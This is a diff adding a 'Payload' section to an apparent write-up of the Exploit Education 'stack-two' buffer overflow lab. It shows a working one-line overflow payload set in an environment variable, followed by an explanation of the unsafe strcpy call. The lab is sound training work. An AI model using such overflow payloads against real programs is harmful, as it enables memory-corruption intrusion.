@@ -52,6 +52,12 @@ int main(int argc, char **argv) {
 }
 ```
 
+## Payload
+```bash
+$ export ExploitEducation=$(python3 -c "print('A' * 64 + '\x0a\x09\x0a\x0d')")
+$ ./stack-two
+```
+
 ## Solution
 
 - This one is a bit more interesting. Now the code is looking for an environment variable `ExploitEducation` to be set. If it is, the value store in this environment variable is copied into `local.buffer` using the unsafe `strcpy()`. 
